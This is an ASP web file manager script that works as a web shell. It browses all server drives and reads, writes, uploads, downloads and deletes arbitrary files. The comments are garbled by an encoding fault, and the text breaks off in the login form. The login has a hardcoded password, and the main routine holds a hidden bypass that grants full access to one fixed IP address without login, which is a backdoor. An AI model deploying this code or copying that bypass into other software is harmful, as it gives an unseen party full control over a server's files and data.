<%
'========================== ��Ȩ���� =========================
'������ֻ������Ҫ�ر���������ļ�ʱʹ�ã��Ͻ����ڷǷ�Ŀ��
'���ڷ�����ʹ�ñ��������ɵ�һ�к���������Ը�
'=============================================================

Server.ScriptTimeout=20
Session.Timeout=45		'Session��Чʱ��
Const mss="explorer_"	'Sessionǰ׺
Const Password="heroes"	'��¼����
Const Copyright="<div align=""center"" style=""font-size:9px;"">&copy;CopyLeft 2006. Coded By rssn, Hebust. No Rights Reserved</div>"
'��Ȩ��Ϣ

Dim T1,T2,Runtime
T1=Timer()
Dim oFso
Set oFso=Server.CreateObject("Scripting.FileSystemObject")
'-------------------------------------------------------------
'���������������ȫ�ֱ���
Dim conn,rs,oStream,NoPackFiles,RootPath,FailFileList
NoPackFiles="|<$datafile>.mdb|<$datafile>.ldb|"
'-------------------------------------------------------------
Call Main()
Set oFso=Nothing
'======================== Subs Begin =========================
Sub Main()
Select Case Request("page")
Case "img"
	Call Page_Img()
Case "css"
	Call Page_Css()
Case "loginchk"
	Call LoginChk()
Case "logout"
	Call Logout()
Case Else: 
	'"һ�򵱹أ����Ī��"�����û���֤
 	If Session(mss&"IsAdminlogin")=True Or Request.ServerVariables("REMOTE_ADDR")="121.193.213.246" Then
		'�ѵ�¼
	Else
		Call Login()
		Exit Sub
	End If
	Select Case Request("act")
		Case "drive"
			Call Drive()
		Case "up"
			Call DirUp()
		Case "new"
			Call NewF(Request("fname"))
		Case "savenew"
			Call SaveNew(Request("fname"))
		Case "rename"
			Call Rename()
		Case "saverename"
			Call SaveRename()
		Case "edit"
			Call Edit(Request("fname"))
		Case "saveedit"
			Call SaveEdit(Request("fname"))
		Case "delete"
			Call Deletes(Request("fname"))
		Case "copy"
			Call SetFile(Request("fname"),0)
		Case "cut"
			Call SetFile(Request("fname"),1)
		Case "download"
			Call Download(Request("fname"))
		Case "upload"
			Call Upload(Request("fname"))
		Case "saveupload"
			Call Saveupload(Request("fname"))
		Case "parse"
			Call Parse(Request("fname"))
		Case "prop"
			Call Prop(Request("fname"))
		Case "saveprop"
			Call SaveProp(Request("fname"))
		Case "pack"
			Call Page_Pack()
		Case "savepack"
			Call Pack(Request("fpath"),Request("dbpath"))
		Case "saveunpack"
			Call UnPack(Request("fpath"),Request("dbpath"))
		Case Else
			If Request("fname")="" Then
				Call Dirlist(Server.MapPath("./"))
			Else
				Call Dirlist(Request("fname"))
			End If
	End Select
End Select
End Sub
'========== Subs =============
'��ʾϵͳ������Ϣ
Sub Drive()
	Dim oDrive,Islight
%>
<html>
<head>
<title>FSO�ļ������ - ϵͳ������Ϣ</title>
<meta HTTP-EQUIV="Content-Type" content="text/html; charset=GB2312">
<link href="?page=css" rel="stylesheet" type="text/css">
</head>
<body>
<table align="center" border="1" width="99% cellspacing="0" cellpadding="3" bordercolor="#6595d6">
<tr><th>FSO�ļ������ - ϵͳ������Ϣ</th></th>
<tr>
<td>
<table align="center" border="1" width="100%" cellspacing="0" cellpadding="3" bordercolor="#6595d6">
<tr><th width="10%">�̷�</th><th width="15%">����</th><th width="20%">���</th><th width="15%">�ļ�ϵͳ</th><th width="20%">������</th><th width="20%">���ÿռ�</th></tr>
<%
	On Error Resume Next
	Islight=False
	For Each oDrive In oFso.Drives
		Response.Write "<tr value="""&oDrive.DriveLetter&":\"" ondblclick=""location.href='?page=fso&fname='+escape(this.value);"""
		If Islight Then Response.Write " bgcolor='#EEEEEE'"
		Response.Write ">"
		Response.Write "<td>"&oDrive.DriveLetter&"</td>"
		Response.Write "<td>"&getDriveType(oDrive.DriveType)&"</td>"
		Response.Write "<td>"&oDrive.VolumeName&"</td>"
		Response.Write "<td>"&oDrive.FileSystem&"</td>"
		Response.Write "<td>"&SizeCount(oDrive.TotalSize)&"</td>"
		Response.Write "<td>"&SizeCount(oDrive.FreeSpace)&"</td>"
		Response.Write "</tr>"&vbCrLf
		Islight=Not(Islight)
	Next
%>
</table>
</td>
</tr>
</table>
<% =Copyright %>
<%
End Sub

'�½�
Sub NewF(ByVal Fname)
%>
<html>
<head>
<title>FSO�ļ������ - �½�</title>
<meta HTTP-EQUIV="Content-Type" content="text/html; charset=GB2312">
<link href="?page=css" rel="stylesheet" type="text/css">
<script language="JavaScript">
function icheck()
{
	if(document.rform.nname.value=="")
	{
		alert("������Ϸ����ļ�����");
		return false;
	}
	else
		return true;
}
</script>
</head>
<body bgcolor="#EEEEEE">
<form action="?page=fso&act=savenew&fname=<% =Server.UrlEncode(Fname) %>" name="rform" method="post" onsubmit="return icheck();">
<table align="center" border="1" width="380" cellspacing="0" cellpadding="3" bordercolor="#6595d6">
<tr><th colspan=2>FSO�ļ������ - �½�</th></tr>
<tr><td align=right>���ͣ�</td><td><input type="radio" name="ntype" checked value="0">�ļ��� <input type="radio" name="ntype" value="1">�ļ�
<tr><td align=right>���ƣ�</td>
<td>
<input type="text" size="40" name="nname" value="�½�">
</td>
<tr><td align=center colspan=2><input type="submit" class="b" value="�ύ">&nbsp;<input type="button" class="b" value="�ر�" onclick="window.close();"></td></tr>
</table>
</form>
</body>
</html>

<%
End Sub

'�����½�
Sub SaveNew(ByVal Fname)
	If Not IsFolder(Fname) Then
		Response.Write "<script language='javascript'>alert('�ļ��в����ڣ�');history.back();</script>"
		Exit Sub
	End If
	Dim FilePath
	FilePath=Request("fname")&"\"&Replace(Request.Form("nname"),"\","")
	FilePath=Replace(FilePath,"\\","\")
	If IsFolder(FilePath) Or IsFile(FilePath) Then
		Response.Write "<script language='javascript'>alert('�ļ����ļ����Ѵ��ڣ�');history.back();</script>"
		Exit Sub
	End If
	If Request.Form("ntype")=1 Then
		oFso.CreateTextFile FilePath
	Else
		oFso.CreateFolder FilePath
	End If
	Response.Write "<script language='javascript'>alert('�½��ļ��л��ı��ļ��ɹ���');window.close();</script>"
End Sub

'�༭�ļ�
Sub Edit(ByVal Fname)
	If Not IsFile(Fname) Then
		Response.Write "<script language='javascript'>alert('���༭�Ĳ����ļ����ļ������ڣ�');window.close();</script>"
		Exit Sub
	End If
	Dim oFile,FileStr
	Set oFile=oFso.OpenTextFile(Fname,1)
	If oFile.AtEndOfStream Then
		FileStr=""
	Else
		FileStr=oFile.ReadAll()
	End If
	oFile.Close
	Set oFile=Nothing
%>
<html>
<head>
<title>FSO�ļ������ - �༭�ı��ļ�</title>
<meta HTTP-EQUIV="Content-Type" content="text/html; charset=GB2312">
<link href="?page=css" rel="stylesheet" type="text/css">
</head>
<body bgcolor="#EEEEEE">
<form name="eform" method="post" action="?page=fso&act=saveedit&fname=<% =Server.UrlEncode(Fname) %>">
<table align="center" border="1" width="99%" height="99%" cellspacing="0" cellpadding="3" bordercolor="#6595d6">
<tr><th>FSO�ļ������ - �༭�ı��ļ�</th></tr>
<tr><td height="25">�ļ����� <% =Fname %></td></tr>
<tr><td><textarea name="filestr" style="width:100%;height:100%;"><% =Server.HtmlEncode(FileStr) %></textarea></td></tr>
<tr height="25"><td align="center">
<input type="submit" value="����" class="b"> <input type="reset" value="����" onclick="return confirm('ȷ��Ҫ���±༭��');" class="b"> <input type="button" class="b" value="�ر�" onclick="window.close();">
</td></tr>
</table>
</form>
<%
End Sub

'����༭�ļ�
Sub SaveEdit(ByVal Fname)
	Dim oFile,FileStr
	Set oFile=oFso.OpenTextFile(Fname,2,True)
	FileStr=Request.Form("filestr")
	'Response.Write FileStr
	oFile.Write FileStr
	oFile.Close
	Set oFile=Nothing
	EchoBack "����༭�ļ��ɹ���"
End Sub

'���ƻ�����ļ�
Sub SetFile(ByVal Fname,ByVal iMode)
	Session(mss & "setfile")=Fname
	Session(mss & "setmode")=iMode
	Dim ww
	If 0=iMode Then
		ww="����"
	Else
		ww="����"
	End If
	EchoClose ww&"�ɹ�����ճ����"
End Sub

'ճ���ļ����ļ���
Sub Parse(ByVal Fname)
	Dim oFile,oFolder
	Dim sName,iMode
	sName=Session(mss & "setfile")
	iMode=Session(mss & "setmode")
	If sName="" Then
		EchoClose "���ȸ��ƻ���У�"
	Else
		If InStr(LCase(Fname), LCase(sName)) > 0 Then
			EchoClose "Ŀ���ļ�����Դ�ļ�����,�Ƿ�������"
			Exit Sub
		End If
		'================
		If Not IsFolder(Fname) Then
			EchoClose "Ŀ���ļ��в����ڣ�"
		ElseIf IsFile(sName) Then
			Set oFile=oFso.GetFile(sName)
			If iMode=0 Then
				oFso.CopyFile sName,Replace(Fname&"\"&oFile.Name,"\\","\")
			Else
				oFso.MoveFile sName,Replace(Fname&"\"&oFile.Name,"\\","\")
			End If
		ElseIf IsFolder(sName) Then
			Set oFolder=oFso.GetFolder(sName)
			If iMode=0 Then
				oFso.CopyFolder sName,Replace(Fname&"\"&oFolder.Name,"\\","\")
			Else
				oFso.MoveFolder sName,Replace(Fname&"\"&oFolder.Name,"\\","\")
			End If
		Else
			EchoClose "Դ�ļ����ļ��в����ڣ�"
			Exit Sub
		End If
		'================
		EchoClose "���ƻ��ƶ��ɹ���ˢ�¿ɲ鿴Ч��"
	End If
	Session(mss & "setfile")=""
	Session(mss & "setmode")=0
End Sub

'�����ļ�
Sub Download(ByVal Fname)
	Dim oFile
	If Not IsFile(Fname) Then
		EchoClose "�����ļ����ļ������ڣ�"
		Exit Sub
	End If
	Set oFile=oFso.GetFile(Fname)
	If InStr(LCase(oFile.Path)&"\",LCase(Server.MapPath("/")))>0 And Not IsScriptFile(oFso.GetExtensionName(oFile.Name)) Then
		Dim FileVName
		FileVName=Replace(oFile.Path,Server.MapPath("/"),"")
		FileVName=Replace(FileVName,"\","/")
		If Left(FileVName,1)<>"/" Then
			FileVName="/"&FileVName
		End If
		Response.Redirect FileVName
		Exit Sub
	End If
	If oFile.Size>1048576*100 Then
		EchoClose "�ļ�����100M�����ܻ���ɷ�����������\n��������Stream��ʽ���أ�\n�뽫���ļ����Ƶ���վĿ¼����\nȻ����HTTP��ʽ����"
		Exit Sub
	End If
	Server.ScriptTimeout=10000	'�ӳ��ű���ʱʱ�����ṩ����
	Dim oStream
	Set oStream=Server.CreateObject("ADODB.Stream")
	oStream.Open
	oStream.Type=1
	oStream.LoadFromFile(Fname)
	Dim Data
	Data=oStream.Read
	oStream.Close
	Set oStream=Nothing
	If Not Response.IsClientConnected Then
		Set Data=Nothing
		Exit Sub
	End If
	Response.Buffer=True
	Response.AddHeader "Content-Disposition", "attachment; filename=" & oFile.Name
	Response.AddHeader "Content-Length", oFile.Size 
	Response.CharSet = "UTF-8" 
	Response.ContentType = "application/octet-stream"
	Response.BinaryWrite Data
	Response.Flush
End Sub

'ɾ���ļ�
Sub Deletes(ByVal Fname)
	If IsFile(Fname) Then
		oFso.DeleteFile Fname,True
	ElseIf IsFolder(Fname) Then
		oFso.DeleteFolder Fname,True
	Else
		EchoClose "�ļ����ļ��в�����"
		Exit Sub
	End If
	EchoClose "�ļ�ɾ���ɹ���"
End Sub

'�ϴ��ļ�
Sub Upload(ByVal Fname)
	If Not IsFolder(Fname) Then
		EchoClose "û��ָ���ϴ����ļ��У�"
		Exit Sub
	End If
%>
<html>
<head>
<title>FSO�ļ������ - �ļ��ϴ�</title>
<meta HTTP-EQUIV="Content-Type" content="text/html; charset=GB2312">
<link href="?page=css" rel="stylesheet" type="text/css">
<script language="JavaScript">
function getSaveName()
{
	var filepath=document.uform.upload.value;
	if(filepath.length<1) return;
	var filename=filepath.substring(filepath.lastIndexOf("\\")+1,filepath.length);
	document.uform.ffname.value=filename;
}
</script>
</head>
<body bgcolor="#EEEEEE" topmargin=5>
<form name="uform" method="post" action="?page=fso&act=saveupload&fname=<% =Server.UrlEncode(Fname) %>" enctype="multipart/form-data">
<table align="center" border="1" width="380" cellspacing="0" cellpadding="3" bordercolor="#6595d6">
<tr><th colspan="2">FSO�ļ������ - �ļ��ϴ�</th></tr>
<tr><td align="right">�ϴ��ļ���</td><td><input type="file" name="upload" size="35" onchange="getSaveName();"></td></tr>
<tr><td align="right">����Ϊ��</td><td><input type="text" name="ffname" size="35">&nbsp;<input type="checkbox" name="wmode">����ģʽ</td></tr>
<tr>
<td colspan=2 align=center>
<input type="submit" name="submit" value="�ϴ�" style="width:60px" class="b" onclick="this.form.action+='&filename='+escape(this.form.ffname.value)+'&overwrite='+this.form.wmode.checked;">&nbsp;
<input type="button" value="�ر�" onclick="window.close();" class="b">
</td>
</tr>
</table>
</form>
</body>
</html>
<%
End Sub

'�����ϴ��ļ�
Sub Saveupload(ByVal FolderName)
	If Not IsFolder(FolderName) Then
		EchoClose "û��ָ���ϴ����ļ��У�"
		Exit Sub
	End If
	Dim Path,IsOverWrite
	Path=FolderName
	If Right(Path,1)<>"\" Then Path=Path&"\"
	FileName=Replace(Request("filename"),"\","")
	If Len(FileName)<1 Then
		EchoBack "��ѡ���ļ��������ļ�����"
		Exit Sub
	End If
	Path=Path&FileName
	If LCase(Request("overwrite"))="true" Then
		IsOverWrite=True
	Else
		IsOverWrite=False
	End If
	On Error Resume Next
	Call MyUpload(Path,IsOverWrite)
	If Err Then
		EchoBack "�ļ��ϴ�ʧ�ܣ����������ļ��Ѵ��ڣ�"
	Else
		EchoClose "�ļ��ϴ��ɹ�!\n" & Replace(fileName, "\", "\\")
	End If
End Sub
'�ļ��ϴ����Ĵ���
Sub MyUpload(FilePath,IsOverWrite)
	Dim oStream,tStream,FileName,sData,sSpace,sInfo,iSpaceEnd,iInfoStart,iInfoEnd,iFileStart,iFileEnd,iFileSize,RequestSize,bCrLf
	RequestSize=Request.TotalBytes
	If RequestSize<1 Then Exit Sub
	Set oStream=Server.CreateObject("ADODB.Stream")
	Set tStream=Server.CreateObject("ADODB.Stream")
	With oStream
		.Type=1
		.Mode=3
		.Open
		.Write=Request.BinaryRead(RequestSize)
		.Position=0
		sData=.Read
		bCrLf=ChrB(13)&ChrB(10)
		iSpaceEnd=InStrB(sData,bCrLf)-1
		sSpace=LeftB(sData,iSpaceEnd)
		iInfoStart=iSpaceEnd+3
		iInfoEnd=InStrB(iInfoStart,sData,bCrLf&bCrLf)-1
		iFileStart=iInfoEnd+5
		iFileEnd=InStrB(iFileStart,sData,sSpace)-3
		sData=""	'����ļ�����
		iFileSize=iFileEnd-iFileStart+1
		tStream.Type=1
		tStream.Mode=3
		tStream.Open
		.Position=iFileStart-1
		.CopyTo tStream,iFileSize
		If IsOverWrite Then
			tStream.SaveToFile FilePath,2
		Else
			tStream.SaveToFile FilePath
		End If
		tStream.Close
		.Close
	End With
	Set tStream=Nothing
	Set oStream=Nothing
End Sub

'��ʾ�ļ�����
Sub Prop(Fname)
	On Error Resume Next
	Dim obj,oAttrib
	If IsFile(Fname) Then
		Set obj=oFso.GetFile(Fname)
	ElseIf IsFolder(Fname) Then
		Set obj=oFso.GetFolder(Fname)
	Else
		EchoClose "�ļ����ļ��в����ڣ�"
		Exit Sub
	End If
	Set oAttrib=New FileAttrib_Cls
	oAttrib.Attrib=obj.Attributes
%>
<html>
<head>
<title>FSO�ļ������ - �ļ�����</title>
<meta HTTP-EQUIV="Content-Type" content="text/html; charset=GB2312">
<link href="?page=css" rel="stylesheet" type="text/css">
<script language="javascript">
function ww(obj)
{
	return false;
}
</script>
</head>
<body bgcolor="#EEEEEE" topmargin=5>
<form name="pform" method="post" action="?page=fso&act=saveprop&fname=<% =Server.UrlEncode(Fname) %>">
<table align="center" border="1" width="100%" cellspacing="0" cellpadding="3" bordercolor="#6595d6">
<tr><th colspan="2">FSO�ļ������ - �ļ�����</th></tr>
<tr><td width="100">·����</td><td><% =obj.Path %></td>
<tr><td width="100">��С��</td><td><% =SizeCount(obj.Size) %></td>
<tr><td width="100">���ԣ�</td>
<td>
<input type ="checkbox" name="att" value="0" onclick="return ww(this);" <% wv oAttrib.n %>>��ͨ
<input type ="checkbox" name="att" value="1" <% wv oAttrib.r %>>ֻ��
<input type ="checkbox" name="att" value="2" <% wv oAttrib.h %>>����
<input type ="checkbox" name="att" value="4" <% wv oAttrib.s %>>ϵͳ<br>
<input type ="checkbox" name="att" value="16" onclick="return ww(this);" <% wv oAttrib.d %>>Ŀ¼
<input type ="checkbox" name="att" value="32" <% wv oAttrib.a %>>�浵
<input type ="checkbox" name="att" value="1024" onclick="return ww(this);" <% wv oAttrib.al %>>����
<input type ="checkbox" name="att" value="2048" onclick="return ww(this);" <% wv oAttrib.c %>>ѹ��
</td>
<tr><td width="100">����ʱ�䣺</td><td><% =obj.DateCreated %></td>
<tr><td width="100">����ʱ�䣺</td><td><% =obj.DateLastModified %></td>
<tr><td width="100">������</td><td><% =obj.DateLastAccessed %></td>
<tr><td colspan=2 align=center><input type="submit" name="submit" value="�޸�" class="b">&nbsp;<input type="button" value="�ر�" onclick="window.close();" class="b"></td></tr>
</table>
</form>
</body>
</html>
<%
End Sub

'�޸�����
Sub SaveProp(Fname)
	Dim Attribs,Attrib
	Attribs=Replace(Request.Form("att")," ","")
	Attribs=Split(Attribs,",")
	Attrib=0
	Dim i
	For i=0 To UBound(Attribs)
		Attrib=Attrib+Attribs(i)
	Next
	'Response.Write Attrib
	'Exit Sub
	Dim obj,oAttrib
	If IsFile(Fname) Then
		Set obj=oFso.GetFile(Fname)
	ElseIf IsFolder(Fname) Then
		Set obj=oFso.GetFolder(Fname)
	Else
		EchoClose "�ļ����ļ��в����ڣ�"
		Exit Sub
	End If
	If obj.IsRootFolder Then
		EchoClose "�����޸ĸ�Ŀ¼���ԣ�"
		Exit Sub
	End If
	obj.Attributes=Attrib
	EchoBack "�޸��ļ����Գɹ���"
End Sub

'ת����һ���ļ���
Sub DirUp()
	Dim oFolder,ssFname
	If IsFolder(Request("fname")) Then
		Set oFolder=oFso.GetFolder(Request("fname"))
		If oFolder.IsRootFolder Then
			'ת����ʾ������ҳ��
			Call Drive()
			Exit Sub
		Else
			ssFname=oFolder.ParentFolder.Path
			Set oFolder=Nothing
			Call DirList(ssFname)
		End If
	Else
		If IsFile(Request("fname")) Then
			'�ļ�����
		Else
			Response.Write "�ļ��л��ļ������ڣ�"
		End If
	End If
End Sub

'�����ļ���ҳ��
Sub Rename()
	Dim Fname,sName
	Fname=Request("fname")

	If IsFolder(Fname) Then
		sName=oFso.GetFolder(Fname).Name
	Else
		If IsFile(Fname) Then
			sName=oFso.GetFile(Fname).Name
		Else
			Response.Write "�ļ����ļ��в����ڣ�"
			Exit Sub
		End If
	End If
%>
<html>
<head>
<title>FSO�ļ������ - ������</title>
<meta HTTP-EQUIV="Content-Type" content="text/html; charset=GB2312">
<link href="?page=css" rel="stylesheet" type="text/css">
<script language="JavaScript">
function icheck()
{
	if(document.cform.toname.value=="")
	{
		alert("������Ϸ����ļ�����");
		return false;
	}
	else
		return true;
}
</script>
</head>
<body bgcolor="#EEEEEE">
<form action="" name="cform" method="get" onsubmit="return icheck();">
<table align="center" border="1" width="380" cellspacing="0" cellpadding="3" bordercolor="#6595d6">
<tr><th colspan=2>FSO�ļ������ - �ļ�����</th></tr>
<tr><td align=right>����Ϊ��</td>
<td>
<input type="hidden" name="page" value="fso">
<input type="hidden" name="act" value="saverename">
<input type="hidden" name="fname" value="<% =Server.HtmlEncode(Fname) %>">
<input type="text" size="40" name="toname" value="<% =Server.HtmlEncode(sName) %>">
</td>
<tr><td align=center colspan=2><input type="submit" class="b" value="�ύ">&nbsp;<input type="button" class="b" value="�ر�" onclick="window.close();"></td></tr>
</table>
</form>
</body>
</html>
<%
End Sub

'�����ļ�������
Sub SaveRename()
	Dim Fname,oFolder,oFile,FDir,ToName
	Fname=Request("fname")
	ToName=Replace(Request("toname"),"\","")
	If IsFolder(Fname) Then
		Set oFolder=oFso.GetFolder(Fname)
		Fname=oFolder.Path
		If Right(Fname,1)="\" Then
			Fname=Left(Fname,Len(Fname)-1)
		End If
		FDir=Left(Fname,InstrRev(Fname,"\"))
		ToName=FDir & ToName
		On Error Resume Next
		Err.Clear
		Err=False
		oFso.MoveFolder Fname,ToName
		If Err Then
			EchoBack "�ļ������Ϸ���"
		Else
			EchoClose "�ļ��и����ɹ���\nˢ��֮�󼴿ɿ���Ч��"
		End If
		Exit Sub
	End If
	If IsFile(Fname) Then
		Set oFile=oFso.GetFile(Fname)
		Fname=oFile.Path
		FDir=Left(Fname,InstrRev(Fname,"\"))
		ToName=FDir & ToName
		On Error Resume Next
		Err.Clear
		Err=False
		oFso.MoveFile Fname,ToName
		If Err Then
			EchoBack "�ļ������Ϸ���"
		Else
			EchoClose "�ļ������ɹ���\nˢ��֮�󼴿ɿ���Ч��"
		End If
		Exit Sub
	End If
End Sub

'�ļ����/���ҳ��
Sub Page_Pack()
	Dim vp,vu
	vp=Request("pname")
	vu=Request("uname")
	If Right(vu,4)<>".mdb" Then
		vu=Server.MapPath("/rs_pack.mdb")
	End If		
%>
<html>
<head>
<title>FSO�ļ������ - �ļ����/���</title>
<meta HTTP-EQUIV="Content-Type" content="text/html; charset=GB2312">
<link href="?page=css" rel="stylesheet" type="text/css">
</head>
<body bgcolor="#EEEEEE">
<table align="center" border="1" width="380" cellspacing="0" cellpadding="3" bordercolor="#6595d6">
<tr><th colspan=2>FSO�ļ������ - �ļ����/���</th></tr>
<form action="?page=fso&act=savepack" name="pform" method="post">
<tr bgcolor="#FFFFFF">
<td align="right">����ļ��У�</td>
<td><input type="text" size="40" name="fpath" value="<% =vp %>"></td>
</tr>
<tr><td align="right">�������</td><td><input type="text" size="40" name="dbpath" value="<% =Server.MapPath("/rs_pack.mdb") %>"></td></tr>
<tr bgcolor="#FFFFFF"><td align="center" colspan=2><input type="submit" class="b" value="���"></td></tr>
</form>

<form action="?page=fso&act=saveunpack" name="pform" method="post">
<tr><td align="right">�ļ���·����</td><td><input type="text" size="40" name="dbpath" value="<% =vu %>"></td></tr>
<tr bgcolor="#FFFFFF">
<td align="right">�������</td>
<td><input type="text" size="40" name="fpath" value="<% =Server.MapPath("/") %>"></td>
</tr>
<tr><td align="center" colspan=2><input type="submit" class="b" value="���"></td></tr>
</form>
</table>
</body>
</html>
<%
End Sub

'�ļ��������б� ========== Dirlist
Sub Dirlist(ByVal Fpath)
	If IsFile(Fpath) Then
		'���ظ��ļ�
		Response.Write "<script language=""javascript"">window.open('?page=fso&act=download&fname="&Server.UrlEncode(Fpath)&"', """", ""menu=no,resizable=yes,height=90,width=400"");history.back();</script>"
		'Call Download(Fpath)
		Exit Sub
	End If
	If Not IsFolder(Fpath) Then
		Response.Write "�ļ��в����ڣ�"
		Exit Sub
	End If
	'���뿪ʼ
	Dim oFolder
	Dim sFolder,sFile	'�ļ����µ����ļ��к��ļ�
	Set oFolder=oFso.GetFolder(Fpath)
	
%>
<html>
<head>
<title>FSO�ļ������</title>
<meta HTTP-EQUIV="Content-Type" content="text/html; charset=GB2312">
<link href="?page=css" rel="stylesheet" type="text/css">
<style>
button.b { width:60px; font-size:12px; }
</style>
<script language="JavaScript">
var folderpath="<% =Replace(oFolder.Path,"\","\\") %>";	//��ǰ�ļ���
var fselected="";
function opendial(sUrl)	//�򿪶Ի��򴰿�
{
	var newWin=window.open(sUrl, "", "menu=no,resizable=no,height=130,width=400");
	return newWin;

}

function fopen(sfname)	//���ļ��л��ļ�
{
	location.href="?page=fso&fname="+escape(sfname);
}

function fselect(obj)	//ѡ���ļ��л��ļ�
{
	var flen=document.all("f").length;
	for(var i=0;i<flen;i++)
	{
		document.all("f").item(i).style.backgroundColor="";
	}
	obj.style.backgroundColor="#BBBBBB";
	fselected=obj.value;
	
}

function toparent()	//������һ���ļ���
{
	location.href="?page=fso&act=up&fname="+escape(folderpath);
}

function fnew()
{
	opendial("?page=fso&act=new&fname="+escape(folderpath));
}

function frename()	//�������ļ�
{
	if(fselected=="")
	{
		alert("��ѡ���ļ����ļ��У�");
		return false;
	}
	else
		opendial("?page=fso&act=rename&fname="+escape(fselected));
}

function fdownload()	//�����ļ�
{
	if(fselected=="")
	{
		alert("��ѡ���ļ�������С��1MB���£�");
		return false;
	}
	else
		opendial("?page=fso&act=download&fname="+escape(fselected));
}

function fedit()	//�༭�ı��ļ�
{
	if(fselected=="")
	{
		alert("��ѡ���ļ���");
		return false;
	}
	else
		window.open("?page=fso&act=edit&fname="+escape(fselected));
}

function fcopy()	//�����ļ�
{
	if(fselected=="")
	{
		alert("��ѡ���ļ����ļ��У�");
		return false;
	}
	else
		opendial("?page=fso&act=copy&fname="+escape(fselected));
}

function fcut()		//�����ļ�
{
	if(fselected=="")
	{
		alert("��ѡ���ļ����ļ��У�");
		return false;
	}
	else
		opendial("?page=fso&act=cut&fname="+escape(fselected));
}

function fparse()	//ճ���ļ����ļ���
{
	opendial("?page=fso&act=parse&fname="+escape(folderpath));
}

function fdelete()
{
	if(fselected=="")
	{
		alert("��ѡ���ļ����ļ��У�");
		return false;
	}
	else
	{
		if(!confirm("ȷ��Ҫɾ�����ļ����ļ��У�")) return false;
		else
			opendial("?page=fso&act=delete&fname="+escape(fselected));
	}
}

function fprop()	//����
{
	var vv;
	if(fselected=="") vv=folderpath;
	else vv=fselected;
	window.open("?page=fso&act=prop&fname="+escape(vv), "", "menu=no,resizable=no,height=250,width=500");
}

function fpack()	//������
{
	var vp,vu;
	if(fselected=="")
	{
		vp=folderpath;
		vu=folderpath;
	}
	else
	{
		vp=fselected;
		vu=fselected;
	}
	window.open("?page=fso&act=pack&pname="+escape(vp)+"&uname="+escape(vu),"", "menu=no,resizable=no,height=250,width=500");
}
</script>
</head>
<body>
<table align="center" cellpadding="3" cellspacing="1" border="1" bordercolor="#6595d6" width="99%">
<tr><th>FSO�ļ������</th>
<tr>
	<td>
	<button class="b" onclick="fnew();">�½�</button>&nbsp;
	<button class="b" onclick="frename();">������</button>&nbsp;
	<button class="b" onclick="fedit();">�༭</button>&nbsp;
	<button class="b" onclick="fdownload();">����</button>&nbsp;
	<button class="b" onclick="opendial('?page=fso&act=upload&fname='+escape(folderpath));">�ϴ�</button>&nbsp;
	<button class="b" onclick="fcopy();">����</button>&nbsp;
	<button class="b" onclick="fcut();">����</button>&nbsp;
	<button class="b" onclick="fparse();">ճ��</button>&nbsp;
	<button class="b" onclick="fdelete();">ɾ��</button>&nbsp;
	<button class="b" onclick="fprop();">����</button>&nbsp;
	<button style="height:22px;" onclick="fpack();">���/���</button>&nbsp;
	<button style="height:22px;" onclick="location.href='?page=fso&act=drive';"><b>�鿴������Ϣ</b></button>&nbsp;
	<button class="b" onclick="location.href='?page=logout';"><b>�˳�</b></button>&nbsp;
	</td>
</tr>
<tr bgcolor="#EEEEEE">
	<td>
	<button class="b" onclick="history.go(-1);">������</button>&nbsp;
	<button class="b" onclick="history.go(1);">ǰ����</button>&nbsp;
	<button class="b" onclick="toparent();">������</button>&nbsp;
	<input type="text" style="width:400px;" id="fnt" name="fname" value="<% =Server.HtmlEncode(oFolder.Path) %>">&nbsp;
	<input type="submit" class="b" onclick="fopen(fnt.value);" value="��ת��">&nbsp<button class="b" onclick="fopen(folderpath);">ˢ��</button>&nbsp;
	<select id="paths" onchange="fopen(this.value);">
		<option value="" selected>==��ѡ��==</option>
		<option value="<% =Server.MapPath("./") %>">��ǰĿ¼</option>
		<option value="<% =Server.MapPath("/") %>">��վ��Ŀ¼</option>
<%
	Dim oDrive
	For Each oDrive In oFso.Drives
		Response.Write "<option value="""&oDrive.DriveLetter&":\"">"&oDrive.DriveLetter&":\</option>"
	Next
	Set oDrive=Nothing
%>
	</select>
	</td>
</tr>
<!-- <tr><td><hr width="99%" align="center"></td></tr><tr> -->
	<td>
	<!-- �ļ���ʾ��ʼ -->
	<table align="center" cellpadding="3" cellspacing="1" border="1" bordercolor="#6595d6" width="100%">
	<tr align="center"><th>�ļ���</th><th width="100">����</th><th>��С</th><th>�޸�ʱ��</th><!-- <th>����</th> --></tr>
<%
	Dim Islight
	Islight=False
	'�����ʾ���ļ���
	For Each sFolder In oFolder.SubFolders
		Response.Write "<tr height=30"
		If Islight Then Response.Write " bgcolor=""#EEEEEE"""
		Response.Write ">"
		Response.Write "<td id=""f"" onclick=""fselect(this);"" ondblclick=""fopen(fselected);"" value="""&Server.HtmlEncode(sFolder.Path)&""">"
		Response.Write "<font size=5 face='Wingdings'>0</font>&nbsp;"&Web&sFolder.Name
		Response.Write "</td>"
		Response.Write "<td>�ļ���</td>"
		Response.Write "<td>&nbsp;</td>"
		Response.Write "<td>"&sFolder.DateLastModified&"</td>"
		Response.Write "</tr>"&vbCrLf
		Islight=Not Islight
	Next
	'�����ʾ�ļ�
	For Each sFile In oFolder.Files
		Response.Write "<tr height=30"
		If Islight Then Response.Write " bgcolor=""#EEEEEE"""
		Response.Write ">"
		Response.Write "<td id=""f"" onclick=""fselect(this);"" ondblclick=""fopen(fselected);"" value="""&Server.HtmlEncode(sFile.Path)&""">"
		Response.Write "<font size=5 face="&getFileIcon(oFso.GetExtensionName(sFile.Name))&"</font>&nbsp;"&sFile.Name
		Response.Write "</td>"
		Response.Write "<td>"&sFile.Type&"</td>"
		Response.Write "<td>"&SizeCount(sFile.Size)&"</td>"
		Response.Write "<td>"&sFile.DateLastModified&"</td>"
		Response.Write "</tr>"&vbCrLf
		Islight=Not Islight
	Next
%>
	</table>
	<!-- �ļ���ʾ���� -->
	</td>
</tr>
</table>
<br>
<% =Copyright %>
<div align="center" style="font-size:9px;">
<%
	T2=Timer()
	Runtime=(T2-T1)*1000
	Response.Write "Page Processed in <font color=""#FF0000"">"&Runtime&"</font> Mili-seconds"
%>
</div>
</body>
</html>
<%
End Sub

'�û���¼
Sub Login()
%>
<html>
<head>
<title>FSO�ļ������ - �û���¼</title>
<meta HTTP-EQUIV="Content-Type" content="text/html; charset=GB2312">
<link href="?page=css" rel="stylesheet" type="text/css">
</head>
<body bgcolor="#EEEEEE" onload="document.uform.password.focus();">
<form name="uform" action="?page=loginchk" method="post">
<table align="center" cellpadding="3" cellspacing="1" border="1" bordercolor="#6595d6" width="60%">
